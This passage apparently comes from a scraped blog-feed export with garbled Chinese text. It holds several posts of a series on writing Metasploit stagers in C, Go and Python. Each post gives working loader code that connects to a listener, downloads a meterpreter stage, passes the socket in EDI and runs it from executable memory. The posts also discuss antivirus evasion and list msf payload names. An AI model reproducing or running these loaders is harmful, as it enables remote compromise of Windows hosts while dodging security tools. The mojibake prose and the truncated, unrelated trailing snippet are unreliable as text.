len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeé˜²æ­¢ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) è¿™é‡Œçš„ ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 æ˜¯å¿…è¦çš„ï¼Œè‡³å°‘åœ¨æˆ‘è¿™é‡Œçš„ç¯å¢ƒæ˜¯è¿™æ ·ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªè¿”å›å€¼çš„ç±»å‹ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡ VirtualAlloc ç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œç„¶åæŠŠæˆ‘ä»¬çš„ payload æ”¾åˆ°è¿™å—å†…å­˜åŒºåŸŸé‡Œé¢å»ï¼Œæ–°å¼€è¾Ÿä¸€ä¸ªçº¿ç¨‹ä»è¿™å—å†…å­˜çš„èµ·å§‹åœ°å€å¼€å§‹è¿è¡Œã€‚\nå½“ç„¶ï¼Œå…¶å®å®ç°æ‰§è¡Œ shellcode çš„æ–¹å¼å¤šç§å¤šæ ·ï¼Œè¿™é‡Œé‡‡ç”¨ä½ è‡ªå·±å–œæ¬¢çš„ä¸€ç§æ–¹å¼å³å¯ã€‚\nç»“æœæˆªå›¾ å¯ä»¥çœ‹åˆ°èƒ½å¤ŸæˆåŠŸä¸Šçº¿æ‰§è¡Œå‘½ä»¤\nå‘Šä¸€æ®µè½ è¿™ä¸‰ç¯‡æˆ‘ä»¥ windows çš„ reverse_tcp çš„ payload ä¸ºä¾‹ï¼Œä»¥ä¸‰ä¸ªä¸åŒçš„è¯­è¨€è§†è§’è¿›è¡Œäº†å…·ä½“çš„å®ç°ï¼Œå…·ä½“åŠŸæ•ˆå¯èƒ½éœ€è¦çœ‹ä¸ªäººè‡ªè¡Œå‘æŒ¥äº†ã€‚\næ¥ä¸‹æ¥æˆ‘ä¼šæ…¢æ…¢æŠ½æ—¶é—´ç»§ç»­æŠŠè¿™ä¸ª stagers å¼€å‘ä¸å®Œå…¨æŒ‡åŒ—ç³»åˆ—ç»§ç»­ä¸‹å»ï¼Œä½†æ˜¯å¯èƒ½ä¹‹åå¦‚æœç²¾åŠ›æœ‰é™çš„è¯ä¸ä¼šç»™å‡ºå¤šä¸ªè¯­è¨€çš„å®ç°ï¼Œæˆ‘ä¼šå°½é‡æŠŠå…·ä½“çš„åŸç†ç»†èŠ‚è¯´æ¸…æ¥šï¼Œäº¤ç”±å¤§å®¶è‡ªè¡Œå®ç°ï¼Œä¸‹é¢å¼€å§‹å†™çš„è¯ï¼Œå¯èƒ½ä¼šå†™ msf reverse_http ç›¸å…³çš„ï¼Œæ¯•ç«Ÿè¿™ä¸ªæ˜¯ cs ä¸­çš„ä¸»åŠ›ï¼Œç¼ºç‚¹é™¤äº†éœ€è¦æ¯æ¬¡å¿ƒè·³æ—¶æ‰èƒ½è¿”å›æ•°æ®ï¼Œä¸å¤ŸåŠæ—¶ä¹‹å¤–ï¼Œå…¶å®è¿˜æ˜¯ä¸€ä¸ªå¾ˆä¸é”™çš„ä¸œè¥¿ï¼Œä¹Ÿä¼šç©¿æ’ç€æåˆ°ä¸€äº›å¦‚ä½•ä½¿ç”¨è¿™äº›ä¸œè¥¿æ‰©å±• C2ï¼Œä½¿æˆ‘ä»¬çš„å…æ€æ›´å…·çµæ´»æ€§ã€‚\nå…¶å®å¦ä¸€æ–¹é¢æ¥è¯´ï¼Œé¢å¯¹æ€è½¯å¦‚æœå¯¹ç½‘ç»œæœ‰å®æ—¶ç›‘æ§çš„è¯ï¼Œè¿™ç§ç›´æ¥ä¼ å› stages çš„æ–‡ä»¶ç‰¹å¾æ¯”è¾ƒæ˜æ˜¾ï¼Œæˆ‘ä¹Ÿä¼šåœ¨æˆ‘ç ”è¯»æºç çš„è¿‡ç¨‹ä¸­æŠŠä¸€äº›æˆæœä¸¢å‡ºæ¥ï¼Œæƒå½“ç»™å¤§å®¶æŠ›ç –å¼•ç‰ã€‚\næ¯”å¦‚ msf ä¸­ç°æœ‰çš„ windows x64 çš„ payload æœ‰è¿™äº›\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf5 exploit(multi/handler) \u0026gt; set payload windows/x64/ set payload windows/x64/exec set payload windows/x64/meterpreter_bind_named_pipe set payload windows/x64/shell/reverse_tcp_uuid set payload windows/x64/loadlibrary set payload windows/x64/meterpreter_bind_tcp set payload windows/x64/shell_bind_tcp set payload windows/x64/messagebox set payload windows/x64/meterpreter_reverse_http set payload windows/x64/shell_reverse_tcp set payload windows/x64/meterpreter/bind_ipv6_tcp set payload windows/x64/meterpreter_reverse_https set payload windows/x64/vncinject/bind_ipv6_tcp set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid set payload windows/x64/meterpreter_reverse_ipv6_tcp set payload windows/x64/vncinject/bind_ipv6_tcp_uuid set payload windows/x64/meterpreter/bind_named_pipe set payload windows/x64/meterpreter_reverse_tcp set payload windows/x64/vncinject/bind_named_pipe set payload windows/x64/meterpreter/bind_tcp set payload windows/x64/pingback_reverse_tcp set payload windows/x64/vncinject/bind_tcp set payload windows/x64/meterpreter/bind_tcp_rc4 set payload windows/x64/powershell_bind_tcp set payload windows/x64/vncinject/bind_tcp_rc4 set payload windows/x64/meterpreter/bind_tcp_uuid set payload windows/x64/powershell_reverse_tcp set payload windows/x64/vncinject/bind_tcp_uuid set payload windows/x64/meterpreter/reverse_http set payload windows/x64/shell/bind_ipv6_tcp set payload windows/x64/vncinject/reverse_http set payload windows/x64/meterpreter/reverse_https set payload windows/x64/shell/bind_ipv6_tcp_uuid set payload windows/x64/vncinject/reverse_https set payload windows/x64/meterpreter/reverse_named_pipe set payload windows/x64/shell/bind_named_pipe set payload windows/x64/vncinject/reverse_tcp set payload windows/x64/meterpreter/reverse_tcp set payload windows/x64/shell/bind_tcp set payload windows/x64/vncinject/reverse_tcp_rc4 set payload windows/x64/meterpreter/reverse_tcp_rc4 set payload windows/x64/shell/bind_tcp_rc4 set payload windows/x64/vncinject/reverse_tcp_uuid set payload windows/x64/meterpreter/reverse_tcp_uuid set payload windows/x64/shell/bind_tcp_uuid set payload windows/x64/vncinject/reverse_winhttp set payload windows/x64/meterpreter/reverse_winhttp set payload windows/x64/shell/reverse_tcp set payload windows/x64/vncinject/reverse_winhttps set payload windows/x64/meterpreter/reverse_winhttps set payload windows/x64/shell/reverse_tcp_rc4 æˆ‘è§‰å¾—å…¶å®æ˜¯å¯ä»¥æŒ‘å‡ºä¸€äº›è‡ªå·±æ„Ÿå…´è¶£çš„è¿›è¡Œç ”ç©¶\n","permalink":"https://www.hacktech.cn/post/msf-stagers-develop-3.html","summary":"\u003ch1 id=\"é‡‡ç”¨-python-å¼€å‘stagers\"\u003eé‡‡ç”¨ Python å¼€å‘stagers\u003c/h1\u003e","title":"msf stagerså¼€å‘ä¸å®Œå…¨æŒ‡åŒ—(ä¸‰)"},{"content":"é‡‡ç”¨ Golang å¼€å‘stagers ä¸Šä¸€ç¯‡æ–‡ç«  msf stagerså¼€å‘ä¸å®Œå…¨æŒ‡åŒ—(ä¸€)ä¸­æˆ‘ä»¬è°ˆåˆ°å¦‚ä½•é‡‡ç”¨ c è¿›è¡Œ msf çš„ stagers å¼€å‘ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä»¬æ¢è®¨ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ Golang å®ç°åŒæ ·çš„åŠŸèƒ½\næ€è·¯æ¢³ç† åœ¨ Golang ä¸­ä¸€ç‚¹æ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬å¦‚ä½•èƒ½å¤Ÿè·å–åˆ° socket çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜æ˜¯åŒæ ·çš„æ­¥éª¤\nå‘ msf ç›‘å¬åœ°å€å‘èµ· tcp è¯·æ±‚ è·å– stages å°† socket fd æ”¾å…¥å¯„å­˜å™¨ edi ä»èµ·å§‹åœ°å€å¼€å§‹æ‰§è¡Œ stages ç¼–è¯‘ç¯å¢ƒ OS: Windows 10\nGolang: go version go1.14.1 windows/amd64\nè·å–stages 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 socket, err := net.Dial(\u0026#34;tcp\u0026#34;, \u0026#34;192.168.174.136:4444\u0026#34;) if err != nil { return err } // read payload size var payloadSizeRaw = make([]byte, 4) numOfBytes, err := socket.Read(payloadSizeRaw) if err != nil { return err } if numOfBytes != 4 { return errors.New(\u0026#34;Number of size bytes was not 4! \u0026#34;) } payloadSize := int(binary.LittleEndian.Uint32(payloadSizeRaw)) // read payload var payload = make([]byte, payloadSize) // numOfBytes, err = socket.Read(payload) numOfBytes, err = io.ReadFull(socket, payload) if err != nil { return err } if numOfBytes != payloadSize { return errors.New(\u0026#34;Number of payload bytes does not match payload size! \u0026#34;) } è¿™é‡Œæœ‰å‡ ç‚¹æˆ‘ä»¬éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œç¬¬ä¸€æ˜¯è¯»å–stagesé•¿åº¦æ˜¯éœ€è¦ä½¿ç”¨ binary åº“æŠŠå®ƒè½¬åŒ–ä¸º int32ï¼Œä½ å¯ä»¥ç†è§£ä¸º python ä¸­çš„ struct åº“ï¼Œç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬æƒ¯ç”¨çš„ä» socket è¿æ¥è¯»å–æ•°æ®ä½¿ç”¨çš„æ˜¯ Readï¼Œä½†æ˜¯å¹¶ä¸èƒ½è¯»å…¨ï¼Œå’Œç½‘ç»œæœ‰å…³ç³»ï¼Œéœ€è¦ä½¿ç”¨ ReadFull æˆ–è€… ReadAtLeast è¿›è¡Œè¯»å–ã€‚è¯»å–åˆ° stages åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œäº†ã€‚\nsocket fd æ”¾å…¥ edi 1 2 3 4 5 6 7 8 conn := socket.(*net.TCPConn) fd := reflect.ValueOf(*conn).FieldByName(\u0026#34;fd\u0026#34;) handle := reflect.Indirect(fd).FieldByName(\u0026#34;pfd\u0026#34;).FieldByName(\u0026#34;Sysfd\u0026#34;) socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr())) buff := make([]byte, 4) binary.LittleEndian.PutUint32(buff, socketFd) return buff è¿™éƒ¨åˆ†ä»£ç å°±æ˜¯æˆ‘ä¸Šé¢æ‰€è¯´çš„éš¾ç‚¹äº†ï¼Œé¦–å…ˆ socket, err := net.Dial(\u0026quot;tcp\u0026quot;, \u0026quot;192.168.174.136:4444\u0026quot;) è¿”å›çš„æ˜¯ä¸€ä¸ªæ¥å£ type Conn interface ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä»–çš„çœŸå®ç±»å‹ï¼Œç»§ç»­å¾€é‡Œé¢è·Ÿæˆ‘ä»¬ä¼šå‘ç°ä»–çš„çœŸå®ç±»å‹æ˜¯ *net.TCPConnï¼Œä¸ºä»€ä¹ˆè¦åšè¿™ä¸€æ­¥ï¼Ÿ\næˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªç»“æ„ä½“\n1 2 3 4 5 6 7 8 9 // TCPConn is an implementation of the Conn interface for TCP network // connections. type TCPConn struct { conn } type conn struct { fd *netFD } æˆ‘ä»¬å…¶å®éœ€è¦çš„æ˜¯é‡Œé¢çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬å†å¾€é‡Œè·Ÿä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // Network file descriptor. type netFD struct { pfd poll.FD // immutable until Close family int sotype int isConnected bool // handshake completed or use of association with peer net string laddr Addr raddr Addr } // poll.FD // FD is a file descriptor. The net and os packages embed this type in // a larger type representing a network connection or OS file. type FD struct { // Lock sysfd and serialize access to Read and Write methods. fdmu fdMutex // System file descriptor. Immutable until Close. Sysfd syscall.Handle // Read operation. rop operation // Write operation. wop operation // I/O poller. pd pollDesc // Used to implement pread/pwrite. l sync.Mutex // For console I/O. lastbits []byte // first few bytes of the last incomplete rune in last write readuint16 []uint16 // buffer to hold uint16s obtained with ReadConsole readbyte []byte // buffer to hold decoding of readuint16 from utf16 to utf8 readbyteOffset int // readbyte[readOffset:] is yet to be consumed with file.Read // Semaphore signaled when file is closed. csema uint32 skipSyncNotif bool // Whether this is a streaming descriptor, as opposed to a // packet-based descriptor like a UDP socket. IsStream bool // Whether a zero byte read indicates EOF. This is false for a // message based socket connection. ZeroReadIsEOF bool // Whether this is a file rather than a network socket. isFile bool // The kind of this file. kind fileKind } å¯ä»¥çœ‹åˆ° Sysfd æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬éœ€è¦å–ä¸€ä¸‹ï¼Œè¿™é‡Œå› ä¸º Golang é‡Œé¢å°å†™å¼€å¤´çš„å­—æ®µæ˜¯ä¸å¯¼å‡ºçš„ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨åå°„å–ä¸€ä¸‹\næ³¨æ„ï¼šå¯èƒ½å› ä¸º Golang ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œè¿™ä¸ªç»“æ„æœ‰æ‰€æ›´æ”¹ï¼Œè¯·è‡ªè¡Œè€ƒè¯ä¸€ä¸‹ï¼Œä¸»è¦åŸå› æ˜¯éå¯¼å‡ºå­—æ®µï¼Œå®˜æ–¹æ˜¯ä¸ä¿è¯å‘ä¸‹å…¼å®¹æ€§çš„\næ‰€ä»¥è·å–æ–‡ä»¶æè¿°ç¬¦çš„ä»£ç å°±æ˜¯\n1 2 3 fd := reflect.ValueOf(*conn).FieldByName(\u0026#34;fd\u0026#34;) handle := reflect.Indirect(fd).FieldByName(\u0026#34;pfd\u0026#34;).FieldByName(\u0026#34;Sysfd\u0026#34;) socketFd := *(*uint32)(unsafe.Pointer(handle.UnsafeAddr())) æ–‡ä»¶æè¿°ç¬¦æ˜¯ handle æ‰€æŒ‡å‘çš„å€¼ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹\nç„¶ååé¢çš„è¿˜æ˜¯æˆ‘ä»¬ä¹‹å‰çš„æ“ä½œï¼Œä½¿ç”¨ binary åŒ…æŠŠ uint32 è½¬ä¸º 4bytes æ•°ç»„\nç„¶åæˆ‘ä»¬éœ€è¦æŠŠ socket fd æ”¾å…¥ edi\n1 payload = append(append([]byte{0xBF}, socketFD...), payload...) æŠŠ mov edi, xxxx æ”¾åˆ°äº† stages å¤´éƒ¨\næ‰§è¡Œstages ä¸€åˆ‡çš„å‡†å¤‡å·¥ä½œéƒ½åšå®Œäº†ï¼Œä¸‹é¢å°±æ˜¯å¼€å§‹å‡†å¤‡æ‰§è¡Œäº†ï¼Œç±»ä¼¼æ‰§è¡Œ shellcode çš„æ–¹å¼ï¼Œè¿™é‡Œçš„å®ç°æ–¹å¼å…«ä»™è¿‡æµ·å„æ˜¾ç¥é€šäº†ï¼Œæˆ‘è¿™é‡Œåªç»™æˆ‘æˆ‘è¿™é‡Œçš„å®ç°æ–¹å¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // modify payload to comply with the plan9 calling convention payload = append( []byte{0x50, 0x51, 0x52, 0x53, 0x56, 0x57}, append( payload, []byte{0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3}..., )..., ) addr, _, err := virtualAlloc.Call(0, uintptr(len(payload)), 0x1000|0x2000, 0x40) if addr == 0 { return err } RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(\u0026amp;payload[0])), uintptr(len(payload))) syscall.Syscall(address, 0, 0, 0, 0) è¿™é‡Œçš„ä¸€ä¸²å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦å¯ä»¥ä¸ç”¨åŠ ï¼Œåªæ˜¯ä¸ºäº†éµå®ˆ plan9 æ±‡ç¼–çš„è°ƒç”¨çº¦å®šï¼Œä¸€äº› push ä¿å­˜å †æ ˆç°åœºå’Œ pop è¿˜åŸ\nç„¶åå°±æ˜¯å…ˆé€šè¿‡ç”³è¯· VirtualAlloc ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œç„¶åä½¿ç”¨ RtlCopyMemory æŠŠ stages å­—èŠ‚ç æ‹·è´è¿›å»ï¼Œç„¶åå¼€å§‹è·‘ã€‚\nè¿™é‡Œçš„ windows api ä½¿ç”¨çš„å£°æ˜å¦‚ä¸‹\n1 2 3 4 5 6 var ( kernel32 = syscall.MustLoadDLL(\u0026#34;kernel32.dll\u0026#34;) ntdll = syscall.MustLoadDLL(\u0026#34;ntdll.dll\u0026#34;) virtualAlloc = kernel32.MustFindProc(\u0026#34;VirtualAlloc\u0026#34;) RtlCopyMemory = ntdll.MustFindProc(\u0026#34;RtlCopyMemory\u0026#34;) ) è¿™é‡Œå…¶å®ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ x/windows åº“æ–¹ä¾¿ä½¿ç”¨ã€‚\nç»“æœå±•ç¤º 64ä½ç¼–è¯‘å‡ºæ¥ 1.73Mï¼Œé€šè¿‡ upx å‹ç¼©å 616kbï¼Œ32ä½ç¼–è¯‘å‡ºæ¥ä¼šæ›´å°\næ‰§è¡Œè¯•è¯•\nç›‘å¬ payload windows/x64/meterpreter/reverse_tcp ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šçº¿\næ³¨æ„äº‹é¡¹ å¯èƒ½å› ä¸º Golang ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œè¿™ä¸ªç»“æ„æœ‰æ‰€æ›´æ”¹ï¼Œè¯·è‡ªè¡Œè€ƒè¯ä¸€ä¸‹ï¼Œä¸»è¦åŸå› æ˜¯éå¯¼å‡ºå­—æ®µï¼Œå®˜æ–¹æ˜¯ä¸ä¿è¯å‘ä¸‹å…¼å®¹æ€§çš„ ä¾ç„¶éœ€è¦æ³¨æ„ä½æ•°çš„å·®å¼‚ï¼Œæ¯”å¦‚32ä½çš„payloadè¯·ä½¿ç”¨32ä½ç¼–è¯‘ï¼Œ64ä½payloadä½¿ç”¨64ä½ç¼–è¯‘ æˆæœæºç  æˆæœæºç æˆ‘å°±ä¸è´´å‡ºæ¥äº†ï¼Œå…¶å®ä¹Ÿæ˜¯è¿™äº›ä»£ç ç»„åˆåœ¨ä¸€èµ·\n","permalink":"https://www.hacktech.cn/post/msf-stagers-develop-2.html","summary":"\u003ch1 id=\"é‡‡ç”¨-golang-å¼€å‘stagers\"\u003eé‡‡ç”¨ Golang å¼€å‘stagers\u003c/h1\u003e","title":"msf stagerså¼€å‘ä¸å®Œå…¨æŒ‡åŒ—(äºŒ)"},{"content":"é‡‡ç”¨cå¼€å‘stagers å‰è¨€ ä¹‹å‰æœ‰å†™è¿‡ä¸€ç¯‡ metasploit payloadè¿è¡ŒåŸç†æµ…æ(sockediè°ƒç”¨çº¦å®šæ˜¯ä»€ä¹ˆ)ï¼Œé‡Œé¢æœ‰æåˆ°ä»¥åäº†è§£è¿™äº›ä¸œè¥¿åå¯ä»¥åšçš„äº‹æƒ…ï¼Œå…¶å®åŒ…æ‹¬ä½†ä¸é™äºè‡ªå†™stagersï¼Œæ‰©å±•C2 å®ç°ã€‚æœ¬ç³»åˆ—å°†ä»ä¹‹å‰è¿™ç¯‡æ–‡ç« ä¸­è·å–åˆ°çš„åŸç†æ€§çŸ¥è¯†è¿›è¡Œå®è·µï¼Œä¸€æ­¥æ­¥è®°å½•æˆ‘åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è¸©åˆ°çš„å‘ä¸æ”¶è·ï¼Œè¿™ä¸ªç³»åˆ—å¯èƒ½ä¼šæ›´æ–°å¾—æ¯”è¾ƒæ…¢ï¼Œä¹Ÿå¯èƒ½ä¼šä¸å®šæœŸé¸½ï¼Œå¸Œæœ›å¤§å®¶èƒ½å¤Ÿä¸€åŒå­¦ä¹ ï¼Œæœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹ä¹Ÿæ¬¢è¿å¤§å®¶æ¥æ¢è®¨æŒ‡æ­£ã€‚\nå‰æƒ…æè¦ ä¸Šé¢æˆ‘ä»¬ç»™å‡ºçš„æ–‡ç« è®²åˆ°å…³äºç¬¬ä¸€é˜¶æ®µä¸ç¬¬äºŒé˜¶æ®µçš„äº¤äº’åŸç†\nç®€è¦æ¦‚æ‹¬ä¸€ä¸‹ï¼Œå¯¹äº reverse_tcp çš„payload æ¥è¯´ï¼Œæ‰€ç»™å‡ºçš„ payload æ˜¯ç¬¬ä¸€é˜¶æ®µ (stagers)ï¼Œç„¶åå®ƒä¼šå‘èµ· socket tcp è¿æ¥è¯·æ±‚å‘è¿œç«¯è¯·æ±‚ç¬¬äºŒé˜¶æ®µ (stages) ï¼Œè¿™ä¸ªé˜¶æ®µæ˜¯ä¸€ä¸ªåå°„ dllï¼Œç„¶åæŠŠ socket fd (socketæ–‡ä»¶æè¿°ç¬¦) æ”¾å…¥ edi å¯„å­˜å™¨ï¼Œå¼€å§‹ä»èµ·å§‹åœ°å€æ‰§è¡Œç¬¬äºŒé˜¶æ®µï¼Œç¬¬äºŒé˜¶æ®µåç»­çš„æ“ä½œä¼šç”¨åˆ°è¿™ä¸ª socket fdï¼Œæ‰€ä»¥ä¸€å¼€å§‹éœ€è¦ä¼ å…¥ï¼Œåé¢çš„å…³äºè¿™ä¸ª dll å…·ä½“è¿ä½œä»¥åŠä¸ºä»€ä¹ˆèƒ½ç›´æ¥ä»èµ·å§‹åœ°å€å¼€å§‹è·‘æˆ‘ä»¬æš‚æ—¶ä¸éœ€è¦å…³å¿ƒï¼Œè¿™ä¸ªåœ¨æˆ‘ä¸Šä¸€ç¯‡æ–‡ç« ä¸­å·²æœ‰æåŠã€‚\næ˜ç¡®æ€è·¯ ä¸Šé¢çš„æµç¨‹è¯´çš„å·²ç»æ¯”è¾ƒæ˜ç™½äº†ï¼ˆæ­¤ç¯‡æ–‡ç« é‡Œæˆ‘å°†é‡‡ç”¨ metasploit-loader ä½œä¸ºä»£ç è®²è§£ï¼‰ï¼š\nå‘ msf ç›‘å¬åœ°å€å‘èµ· tcp è¯·æ±‚\nè·å– stages\nå°† socket fd æ”¾å…¥å¯„å­˜å™¨ edi\nä»èµ·å§‹åœ°å€å¼€å§‹æ‰§è¡Œ stages\nå‘èµ·tcpè¯·æ±‚stages å…ˆè´´ä»£ç \né¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªsocketè¿æ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /* é”™è¯¯å¤„ç† */ void punt(SOCKET my_socket, char * error) { printf(\u0026#34;Bad things: %s\\n\u0026#34;, error); closesocket(my_socket); WSACleanup(); exit(1); } ... WSADATA\twsaData; WORD wVersionRequested; wVersionRequested = MAKEWORD(2, 2); if (WSAStartup(wVersionRequested, \u0026amp;wsaData) \u0026lt; 0) { printf(\u0026#34;ws2_32.dll is out of date.\\n\u0026#34;); WSACleanup(); exit(1); } struct hostent *\ttarget; struct sockaddr_in sock; SOCKET my_socket; char* targetip = \u0026#34;192.168.174.136\u0026#34; int port = 4444 /* åˆ›å»ºsocket */ my_socket = socket(AF_INET, SOCK_STREAM, 0); if (my_socket == INVALID_SOCKET) punt(my_socket, \u0026#34;Could not initialize socket\u0026#34;); /* è§£ætargetip*/ target = gethostbyname(targetip); if (target == NULL) punt(my_socket, \u0026#34;Could not resolve target\u0026#34;); /* å‡†å¤‡tcpè¿æ¥ç›¸å…³ä¿¡æ¯ */ memcpy(\u0026amp;sock.sin_addr.s_addr, target-\u0026gt;h_addr, target-\u0026gt;h_length); sock.sin_family = AF_INET; sock.sin_port = htons(port); /* è¿æ¥ */ if ( connect(my_socket, (struct sockaddr *)\u0026amp;sock, sizeof(sock)) ) punt(my_socket, \u0026#34;Could not connect to target\u0026#34;); è¿™éƒ¨åˆ†ä»£ç å°±æ˜¯å’Œæˆ‘ä»¬çš„ msf ç›‘å¬åœ°å€å»ºç«‹ socket è¿æ¥\næ¥ä¸‹æ¥å…³äºstagesæœ‰ç‚¹éœ€è¦è¯´æ˜çš„ã€‚\nstagesç»“æ„ï¼š\nå¼€å¤´ 4byte æ˜¯åç»­çš„ tcp åŒ…é•¿åº¦ 4byte åç´§è·Ÿçš„æ˜¯ä¸€ä¸ª dllï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªpeæ–‡ä»¶ é‚£ä¹ˆæˆ‘ä»¬æŒ‰ç…§è¿™ä¸ªæ–¹å¼å»è¯»\n1 2 3 int count = recv(my_socket, (char *)\u0026amp;size, 4, 0); if (count != 4 || size \u0026lt;= 0) punt(my_socket, \u0026#34;read a strange or incomplete length value\\n\u0026#34;); è¯»å‡ºåé¢çš„ dll æ•°æ®åŒ…é•¿åº¦\nç„¶åæˆ‘ä»¬å¼€å§‹è¯»å– dll\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /* æ¥æ”¶æŒ‡å®šé•¿åº¦çš„æ•°æ® */ int recv_all(SOCKET my_socket, void * buffer, int len) { int tret = 0; int nret = 0; void * startb = buffer; while (tret \u0026lt; len) { nret = recv(my_socket, (char *)startb, len - tret, 0); startb += nret; tret += nret; if (nret == SOCKET_ERROR) punt(my_socket, \u0026#34;Could not receive data\u0026#34;); } return tret; } buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer == NULL) punt(my_socket, \u0026#34;could not allocate buffer\\n\u0026#34;); /* æŠŠ socket fd æ”¾å…¥ edi å¯„å­˜å™¨ï¼Œæ³¨æ„è¿™é‡Œçš„ socket å¥æŸ„éœ€è¦å–åˆ°å¥æŸ„æŒ‡å‘çš„é‚£ä¸ªæ•°æ®ï¼Œè€Œä¸æ˜¯å¥æŸ„æŒ‡é’ˆ BF 78 56 34 12 =\u0026gt; mov edi, 0x12345678 */ buffer[0] = 0xBF; /* æ„é€ ä¸Šé¢çš„æœºå™¨ç  */ memcpy(buffer + 1, \u0026amp;my_socket, 4); /* æŠŠè¯»å–å‡ºæ¥çš„æ•°æ®æ”¾åˆ° buffer åé¢ */ count = recv_all(my_socket, buffer + 5, size); è¿™é‡Œéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯æŠŠ socket fd æ”¾å…¥ ediï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œå…·ä½“çš„åŸç†æˆ‘åœ¨ä¸Šä¸€ç¯‡æ–‡ç« æœ‰æåˆ°ã€‚\næ‰§è¡Œstages ç°åœ¨æˆ‘ä»¬åªéœ€è¦åƒä¹‹å‰æ‰§è¡Œ shellcode é‚£æ ·æ‰§è¡Œå³å¯\n1 2 3 /* æŠŠbufferå¼ºè½¬ä¸ºä¸€ä¸ªå‡½æ•°å»è°ƒç”¨ */ function = (void (*)())buffer; function(); ç„¶åæŠŠè¿™äº›ä»£ç ç»„åˆèµ·æ¥è¿›è¡Œç¼–è¯‘\nç¼–è¯‘ ç¼–è¯‘éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼špayloadå¿…é¡»å¯¹åº”\næ¯”å¦‚32ä½çš„payloadå¿…é¡»ç¼–è¯‘ä¸º32ä½çš„ï¼Œç›¸åº”çš„64ä½å¿…é¡»ç¼–è¯‘ä¸º64ä½\n","permalink":"https://www.hacktech.cn/post/msf-stagers-develop-1.html","summary":"\u003ch1 id=\"é‡‡ç”¨cå¼€å‘stagers\"\u003eé‡‡ç”¨cå¼€å‘stagers\u003c/h1\u003e","title":"msf stagerså¼€å‘ä¸å®Œå…¨æŒ‡åŒ—(ä¸€)"},{"content":"2020/05/13 14:50æ›´æ–°\nåœ¨è¯„è®ºçš„é©±ä½¿ä¸‹æˆ‘ä»”ç»†å»çœ‹äº†ä¸‹ï¼Œæœ‰å‡ å¤„ç¡®å®ç”¨åˆ°äº†åç«¯æ¥å£\n1 2 3 loadBlogTalk: (page) =\u0026gt; { return forwardXmlJsonp(\u0026#34;https://ing.cnblogs.com/u/\u0026#34; + blogConst.blogAcc + \u0026#34;/\u0026#34; + page, parseTalkList); }, 1 2 3 loadBlogSearch: (keyword) =\u0026gt; { return forwardXmlJsonp(\u0026#34;https://zzk.cnblogs.com/s/blogpost?w=\u0026#34; + encodeURI(\u0026#34;blog:\u0026#34; + blogConst.blogAcc + \u0026#34; \u0026#34; + keyword), parseSearchKeyWord); }, 1 2 3 4 5 6 7 loadFollowers: (page) =\u0026gt; { let url = 